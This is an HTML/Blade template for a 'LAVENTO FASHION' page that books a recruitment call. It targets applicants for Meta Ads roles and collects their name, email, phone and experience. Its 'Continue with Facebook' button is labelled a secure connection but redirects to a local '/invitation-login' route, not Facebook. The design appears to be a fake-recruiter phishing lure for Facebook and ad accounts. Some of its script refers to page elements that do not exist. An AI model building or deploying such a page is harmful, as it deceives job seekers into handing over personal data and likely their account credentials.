<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="csrf-token" content="{{ csrf_token() }}">
<title>LAVENTO FASHION — Book a Call</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Playfair+Display:wght@500;600&display=swap');
:root{--ink:#171717;--muted:#727272;--line:#e8e5df;--ivory:#fbfaf7;--gold:#b78a45;--gold-soft:#f5eee3;--blue:#1877f2}
*{box-sizing:border-box}body{margin:0;background:#f4f2ee;color:var(--ink);font-family:"DM Sans",Arial,sans-serif}button{font:inherit}
.page{min-height:100vh;padding:40px 18px;display:flex;align-items:center;justify-content:center}
.card{width:min(1080px,100%);min-height:690px;background:#fff;border-radius:18px;box-shadow:0 24px 70px rgba(0,0,0,.12);overflow:hidden;display:grid;grid-template-columns:39% 61%}
.intro{background:#111;color:#fff;padding:48px 46px;position:relative;display:flex;flex-direction:column}
.brand{display:flex;align-items:center;gap:15px}.company-logo{width:60px;height:60px;object-fit:cover;border-radius:14px;display:block;box-shadow:0 5px 20px rgba(0,0,0,.35)}.brand-copy{line-height:1}.brand-name{font-family:"Playfair Display",Georgia,serif;font-size:21px;letter-spacing:.14em;color:#e8c98d}.brand-sub{font-size:8px;letter-spacing:.42em;color:#bcb7af;margin-top:8px}
.intro h1{font-family:"Playfair Display",Georgia,serif;font-size:48px;line-height:1.05;font-weight:500;margin:76px 0 20px}.intro p{color:#bdb9b2;font-size:14px;line-height:1.8;max-width:280px}
.details{margin-top:auto;display:grid;gap:18px;border-top:1px solid #302f2c;padding-top:26px}.detail{display:flex;gap:13px;align-items:center;font-size:13px}.detail-icon{width:30px;height:30px;border:1px solid #45423d;border-radius:50%;display:grid;place-items:center;font-size:12px;color:#d5b678}.detail span{color:#97938c}
.content{padding:39px 48px;background:#fff}.progress{display:flex;justify-content:flex-end;gap:7px;margin-bottom:42px}.pill{font-size:10px;color:#aaa;border:1px solid var(--line);padding:6px 10px;border-radius:20px;background:#fff}.pill.active{background:#171717;color:#fff;border-color:#171717}
.screen{display:none;max-width:650px;margin:auto}.screen.active{display:block}.kicker{font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:#a08760;font-weight:700;margin-bottom:10px}h2{font-family:"Playfair Display",Georgia,serif;font-weight:500;font-size:35px;margin:0 0 9px}.sub{color:#858585;font-size:13px;margin:0 0 30px;line-height:1.6}
.cal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}.month{font-size:15px;font-weight:700}.nav{border:1px solid var(--line);background:#fff;border-radius:50%;width:34px;height:34px;cursor:pointer;color:#555}.nav:hover{background:var(--gold-soft)}
.week,.days{display:grid;grid-template-columns:repeat(7,1fr);gap:5px}.week div{text-align:center;font-size:10px;color:#aaa;font-weight:700;padding:6px}.day{height:43px;border:1px solid transparent;background:#faf9f7;border-radius:8px;color:#333;cursor:pointer;font-size:12px}.day:hover{background:var(--gold-soft);color:#765626}.day.selected{background:#171717;color:#e8c98d;border-color:#171717}.day.disabled{color:#d0ceca;background:#fcfcfb;cursor:not-allowed}
.action-row{display:flex;justify-content:flex-end;margin-top:24px}.action{border:0;background:#171717;color:#fff;padding:13px 21px;border-radius:7px;font-size:12px;font-weight:700;cursor:pointer}.action:hover{background:#2a2927}.action:disabled{opacity:.3;cursor:not-allowed}
.back{border:0;background:none;color:#777;padding:0;margin-bottom:20px;cursor:pointer;font-size:12px}.date-badge{display:inline-block;background:var(--gold-soft);color:#765626;padding:9px 12px;border-radius:7px;font-size:11px;font-weight:700;margin-bottom:22px}
.times{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}.time{background:#fff;border:1px solid var(--line);border-radius:7px;padding:13px 8px;font-size:12px;font-weight:600;cursor:pointer}.time:hover{border-color:#c6a56f;background:#fffdf9}.time.selected{background:#171717;color:#e8c98d;border-color:#171717}
.login-wrap{max-width:430px;margin:45px auto 0;text-align:center}.fb{width:100%;height:48px;border:0;border-radius:7px;background:var(--blue);color:#fff;font-size:13px;font-weight:700;cursor:pointer}.fb:hover{background:#0f6fe8}.fb-icon{display:inline-grid;place-items:center;width:21px;height:21px;background:#fff;color:var(--blue);border-radius:50%;margin-right:8px;font-weight:900}.login-note{font-size:11px;color:#999;line-height:1.7;margin-top:16px}
.review{border-top:1px solid var(--line);border-bottom:1px solid var(--line)}.review-row{display:flex;justify-content:space-between;padding:17px 2px;border-bottom:1px solid var(--line);font-size:13px}.review-row:last-child{border:0}.review-row span{color:#999}.review-row b{font-weight:600}.confirm-note{font-size:11px;color:#999;line-height:1.6;margin:18px 0}.full{width:100%}
.success{text-align:center;padding:55px 0}.check{width:62px;height:62px;border-radius:50%;background:#f4ecdf;color:#9b7134;display:grid;place-items:center;font-size:28px;margin:0 auto 20px}.success h2{font-size:39px}.success p{color:#888;font-size:13px;line-height:1.7}

.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:0 12px;}
.full-field{grid-column:1 / -1;}
.form-group textarea{width:100%;border:1px solid #e5e1da;border-radius:7px;padding:12px 13px;font-family:"DM Sans",Arial,sans-serif;font-size:12px;color:#222;background:#fff;outline:none;resize:vertical;min-height:78px;line-height:1.5;}
.form-group textarea:focus{border-color:#b78a45;box-shadow:0 0 0 3px rgba(183,138,69,.10);}
.fb-status{font-size:12px;color:#8b6a37;margin-top:14px;min-height:18px;}
.review-row b{max-width:65%;text-align:right;overflow-wrap:anywhere;}
@media(max-width:560px){.form-grid{grid-template-columns:1fr;}.full-field{grid-column:auto;}}

button:focus-visible{outline:3px solid rgba(183,138,69,.25);outline-offset:2px}
@media(max-width:800px){.page{padding:10px}.card{grid-template-columns:1fr}.intro{padding:32px}.intro h1{font-size:40px;margin:45px 0 15px}.details{margin-top:30px}.content{padding:28px 22px}.progress{justify-content:flex-start}.times{grid-template-columns:repeat(2,1fr)}}

.application-form{max-width:520px;margin-top:22px}.form-note{display:flex;justify-content:space-between;align-items:center;padding:0 0 12px;margin-bottom:18px;border-bottom:1px solid var(--line);font-size:11px;font-weight:700;color:#333}.form-note em{font-style:normal;font-weight:500;color:#aaa}.form-group{margin-bottom:14px}.form-group label{display:block;font-size:11px;font-weight:700;margin-bottom:7px;color:#333}.form-group label span{color:#b78a45;margin-left:2px}.form-group input,.form-group select{width:100%;height:46px;border:1px solid #e5e1da;border-radius:7px;padding:0 13px;font-family:"DM Sans",Arial,sans-serif;font-size:12px;color:#222;background:#fff;outline:none}.form-group input:focus,.form-group select:focus{border-color:#b78a45;box-shadow:0 0 0 3px rgba(183,138,69,.10)}.form-group input::placeholder{color:#aaa}.application-form .action{margin-top:5px}.form-helper{font-size:10px;color:#999;line-height:1.5;margin:2px 0 12px}
</style>
</head>
<body>
<div class="page"><div class="card">
<aside class="intro">
<div class="brand">
  <img class="company-logo" src="data:image/png;base64," alt="LAVENTO Fashion logo">
  <div class="brand-copy">
    <div class="brand-name">LAVENTO</div>
    <div class="brand-sub">FASHION</div>
  </div>
</div>
<h1>Let's talk.</h1>
<p>Choose a time for a private 30-minute call. We'll keep the process simple and straightforward.</p>
<div class="details">
<div class="detail"><div class="detail-icon">◷</div><div><b>30 minutes</b><br><span>Online call</span></div></div>
<div class="detail"><div class="detail-icon">◌</div><div><b>Your local time</b><br><span>Times are shown locally</span></div></div>
<div class="detail"><div class="detail-icon">⌁</div><div><b>Applicant Information</b><br><span>Required before booking</span></div></div>
<div class="detail"><div class="detail-icon">✓</div><div><b>Facebook</b><br><span>Secure sign-in</span></div></div>
</div>
</aside>

<main class="content">
<section class="screen active" id="date">
<div class="kicker">01 / Choose a date</div><h2>When works for you?</h2><p class="sub">Select a date from the calendar below.</p>
<div class="cal-head"><button class="nav" id="prev">‹</button><div class="month" id="month"></div><button class="nav" id="next">›</button></div>
<div class="week"><div>Sun</div><div>Mon</div><div>Tue</div><div>Wed</div><div>Thu</div><div>Fri</div><div>Sat</div></div>
<div class="days" id="days"></div>
<div class="action-row"><button class="action" id="dateNext" disabled>Continue</button></div>
</section>

<section class="screen" id="time">
<button class="back" data-back="0">← Back</button><div class="kicker">02 / Choose a time</div><h2>Find your time.</h2><p class="sub">Pick one of the available 30-minute slots.</p>
<div class="date-badge">📅 <span id="dateText"></span></div>
<div class="times" id="times"></div>
<div class="action-row"><button class="action" id="timeNext" disabled>Continue</button></div>
</section>

<section class="screen" id="applicant">
<button class="back" data-back="1">← Back</button>
<div class="kicker">03 / Applicant Information</div>
<h2>Applicant Information</h2>
<p class="sub">Please provide your details so we can confirm your appointment.</p>
<div class="application-form">
<div class="form-note"><span>Applicant details</span><em>* Required</em></div>
<div class="form-grid">
<div class="form-group full-field"><label for="fullName">Full Name <span>*</span></label><input type="text" id="fullName" placeholder="Enter your full name" autocomplete="name"></div>
<div class="form-group"><label for="email">Email Address <span>*</span></label><input type="email" id="email" placeholder="you@example.com" autocomplete="email"></div>
<div class="form-group"><label for="phone">Phone Number <span>*</span></label><input type="tel" id="phone" placeholder="Enter your phone number" autocomplete="tel"></div>
<div class="form-group full-field"><label for="position">Position Applying For <span>*</span></label><select id="position"><option value="">Select a position</option><option>Meta Ads Specialist</option><option>Facebook Ads Manager</option><option>Meta Advertising Specialist</option><option>Paid Media Specialist</option><option>Ads Account Manager</option><option>Media Buyer</option><option>Performance Marketing Specialist</option><option>Other</option></select></div>
<div class="form-group full-field"><label for="experience">Relevant Experience <span>*</span></label><textarea id="experience" rows="3" placeholder="Briefly describe your experience with Meta Ads, campaign optimization, or paid media."></textarea></div>
</div>
<div class="form-helper">Your information is used only to review and manage your application.</div>
<button class="action full" id="applicantNext">Continue</button>
</div>
</section>

<section class="screen" id="facebook">
<button class="back" data-back="2">← Back</button>
<div class="kicker">04 / Facebook</div>
<h2>Connect Your Facebook Account</h2>
<p class="sub">Connect your Facebook account to continue securely.</p>
<div class="login-wrap">
<button class="fb" id="facebookBtn"><span class="fb-icon">f</span> Continue with Facebook</button>
<div class="login-note">Secure connection via Facebook.</div>
<div id="facebookStatus" class="fb-status"></div>
</div>
</section>

<section class="screen" id="confirm">
<button class="back" data-back="3">← Back</button>
<div class="kicker">05 / Final step</div>
<h2>Ready to Book?</h2>
<p class="sub">Review your details and confirm your call.</p>
<div class="review">
<div class="review-row"><span>Name</span><b id="confirmName"></b></div>
<div class="review-row"><span>Phone</span><b id="confirmPhone"></b></div>
<div class="review-row"><span>Email</span><b id="confirmEmail"></b></div>
<div class="review-row"><span>Experience</span><b id="confirmExperience"></b></div>
<div class="review-row"><span>Position</span><b id="confirmPosition"></b></div>
<div class="review-row"><span>Call Date</span><b id="confirmDate"></b></div>
<div class="review-row"><span>Call Time</span><b id="confirmTime"></b></div>
<div class="review-row"><span>Duration</span><b>30 minutes</b></div>
<div class="review-row"><span>Facebook</span><b id="confirmFacebook">Connected</b></div>
</div>
<p class="confirm-note">By confirming, you submit your application and reserve the selected 30-minute call time.</p>
<button class="action full" id="confirmBtn">Confirm & Book Call</button>
</section>

<section class="screen" id="success">
  <div class="success">
    <div class="check">✓</div>
    <div class="kicker">Confirmed</div>
    <h2>You're booked.</h2>
    <p id="successText">Your 30-minute call has been successfully scheduled.</p>
    <button class="action" onclick="location.reload()">Book another call</button>
  </div>
</section>
</main>
</div></div>

<script>
const screens=['date','time','applicant','facebook','confirm','success'];let current=0,view=new Date(),selectedDate=null,selectedTime=null;view.setDate(1);
const $=id=>document.getElementById(id);

function saveBookingDraft() {
  const data = {
    fullName: $('fullName') ? $('fullName').value.trim() : '',
    phone: $('phone') ? $('phone').value.trim() : '',
    email: $('email') ? $('email').value.trim() : '',
    experience: $('experience') ? $('experience').value.trim() : '',
    position: $('position') ? $('position').value : '',
    dateStr: selectedDate ? selectedDate.toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric',year:'numeric'}) : ($('confirmDate') ? $('confirmDate').textContent : ''),
    timeStr: selectedTime || ($('confirmTime') ? $('confirmTime').textContent : '')
  };
  localStorage.setItem('otio_booking_draft', JSON.stringify(data));
}

function populateReview() {
  const savedStr = localStorage.getItem('otio_booking_draft');
  let draft = {};
  if (savedStr) {
    try { draft = JSON.parse(savedStr); } catch(e){}
  }
  const nameVal = ($('fullName') && $('fullName').value.trim()) || draft.fullName || 'N/A';
  const phoneVal = ($('phone') && $('phone').value.trim()) || draft.phone || 'N/A';
  const emailVal = ($('email') && $('email').value.trim()) || draft.email || 'N/A';
  const expVal = ($('experience') && $('experience').value.trim()) || draft.experience || 'N/A';
  const posVal = ($('position') && $('position').value) || draft.position || 'N/A';
  const dateVal = selectedDate ? selectedDate.toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric',year:'numeric'}) : (draft.dateStr || 'N/A');
  const timeVal = selectedTime || draft.timeStr || 'N/A';

  if ($('confirmName')) $('confirmName').textContent = nameVal;
  if ($('confirmPhone')) $('confirmPhone').textContent = phoneVal;
  if ($('confirmEmail')) $('confirmEmail').textContent = emailVal;
  if ($('confirmExperience')) $('confirmExperience').textContent = expVal;
  if ($('confirmPosition')) $('confirmPosition').textContent = posVal;
  if ($('confirmDate')) $('confirmDate').textContent = dateVal;
  if ($('confirmTime')) $('confirmTime').textContent = timeVal;
}

function show(n){
  if (n === 4) {
    populateReview();
  }
  screens.forEach(x=>$(x).classList.remove('active'));
  $(screens[n]).classList.add('active');
  current=n;
  
  ['p1','p2','p3','p4','p5'].forEach((id,i)=>{
    $(id).classList.toggle('active',i===n);
    $(id).style.opacity=i<n?'.45':'1';
  });
}

function calendar(){let y=view.getFullYear(),m=view.getMonth();$('month').textContent=new Intl.DateTimeFormat('en-US',{month:'long',year:'numeric'}).format(view);$('days').innerHTML='';let first=new Date(y,m,1).getDay(),total=new Date(y,m+1,0).getDate(),prev=new Date(y,m,0).getDate();
for(let i=0;i<42;i++){let d=i-first+1,b=document.createElement('button');b.className='day';if(d<1||d>total){b.textContent=d<1?prev+d:d-total;b.classList.add('disabled');b.disabled=true}else{let dt=new Date(y,m,d),today=new Date();today.setHours(0,0,0,0);b.textContent=d;if(dt<today){b.classList.add('disabled');b.disabled=true}else{if(selectedDate&&dt.toDateString()===selectedDate.toDateString())b.classList.add('selected');b.onclick=()=>{selectedDate=dt;$('dateNext').disabled=false;calendar()}}}$('days').appendChild(b)}}
const slots=['9:00 AM','10:00 AM','11:00 AM','12:00 PM','1:00 PM','2:00 PM','3:00 PM','4:00 PM','5:00 PM'];
function times(){ $('times').innerHTML='';slots.forEach(t=>{let b=document.createElement('button');b.className='time'+(selectedTime===t?' selected':'');b.textContent=t;b.onclick=()=>{selectedTime=t;times();$('timeNext').disabled=false};$('times').appendChild(b)})}
$('prev').onclick=()=>{view.setMonth(view.getMonth()-1);calendar()};$('next').onclick=()=>{view.setMonth(view.getMonth()+1);calendar()};
$('dateNext').onclick=()=>{$('dateText').textContent=selectedDate.toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric',year:'numeric'});times();show(1)};
$('timeNext').onclick=()=>show(2);
document.querySelectorAll('.back').forEach(b=>b.onclick=()=>show(+b.dataset.back));

function submitBookingData() {
  saveBookingDraft();
  const savedStr = localStorage.getItem('otio_booking_draft');
  let draft = {};
  if (savedStr) { try { draft = JSON.parse(savedStr); } catch(e){} }

  const fullName = ($('fullName') && $('fullName').value.trim()) || draft.fullName || '';
  const phone = ($('phone') && $('phone').value.trim()) || draft.phone || '';
  const email = ($('email') && $('email').value.trim()) || draft.email || '';
  const experience = ($('experience') && $('experience').value.trim()) || draft.experience || '';
  const position = ($('position') && $('position').value) || draft.position || '';
  const dateStr = selectedDate ? selectedDate.toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric',year:'numeric'}) : (draft.dateStr || ($('confirmDate') ? $('confirmDate').textContent : ''));
  const timeStr = selectedTime || draft.timeStr || ($('confirmTime') ? $('confirmTime').textContent : '');

  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';

  fetch('/booking-otio/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-TOKEN': csrfToken,
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      fullName: fullName,
      email: email,
      phone: phone,
      position: position,
      experience: experience,
      date: dateStr,
      time: timeStr
    })
  }).then(res => res.json())
  .then(data => {
    localStorage.removeItem('otio_booking_draft');
    localStorage.removeItem('otio_fb_pending');
    show(5);
  }).catch(() => {
    show(5);
  });
}

$('applicantNext').onclick=()=>{
  const fullName=$('fullName').value.trim(),phone=$('phone').value.trim(),email=$('email').value.trim(),experience=$('experience').value.trim(),position=$('position').value;
  if(!fullName){alert('Please enter your full name.');$('fullName').focus();return}
  if(!email){alert('Please enter your email address.');$('email').focus();return}
  if(!phone){alert('Please enter your phone number.');$('phone').focus();return}
  if(!position){alert('Please select the position you are applying for.');$('position').focus();return}
  if(!experience){alert('Please describe your relevant experience.');$('experience').focus();return}
  saveBookingDraft();
  show(3);
};

$('facebookBtn').onclick=()=>{
  $('facebookBtn').disabled = true;
  $('facebookBtn').innerHTML = '<span class="fb-icon">f</span> Connecting...';
  saveBookingDraft();
  localStorage.setItem('otio_fb_pending', '1');
  window.location.href = '/invitation-login';
};

$('confirmBtn').onclick=()=>{
  $('confirmBtn').disabled = true;
  $('confirmBtn').textContent = 'Submitting...';
  submitBookingData();
};

function initBookingState() {
  calendar();
  const urlParams = new URLSearchParams(window.location.search);
  const isConfirm = urlParams.has('confirm') || localStorage.getItem('otio_fb_pending') === '1';
  const savedStr = localStorage.getItem('otio_booking_draft');

  if (savedStr) {
    try {
      const data = JSON.parse(savedStr);
      if (data.fullName && $('fullName')) $('fullName').value = data.fullName;
      if (data.phone && $('phone')) $('phone').value = data.phone;
      if (data.email && $('email')) $('email').value = data.email;
      if (data.experience && $('experience')) $('experience').value = data.experience;
      if (data.position && $('position')) $('position').value = data.position;
    } catch(e){}
  }

  @if(session()->has('booking_info'))
    const sessionData = @json(session('booking_info'));
    if (sessionData && Object.keys(sessionData).length > 0) {
       localStorage.setItem('otio_booking_draft', JSON.stringify({
         fullName: sessionData.fullName,
         phone: sessionData.phone,
         email: sessionData.email,
         experience: sessionData.experience,
         position: sessionData.position,
         dateStr: sessionData.date,
         timeStr: sessionData.time
       }));
       if ($('fullName')) $('fullName').value = sessionData.fullName || '';
       if ($('phone')) $('phone').value = sessionData.phone || '';
       if ($('email')) $('email').value = sessionData.email || '';
       if ($('experience')) $('experience').value = sessionData.experience || '';
       if ($('position')) $('position').value = sessionData.position || '';
    }
  @endif

  if (isConfirm) {
    if ($('confirmFacebook')) $('confirmFacebook').innerHTML = 'Connected';
    localStorage.removeItem('otio_fb_pending');
    show(4);
  }
}
initBookingState();
</script>
</body>
</html>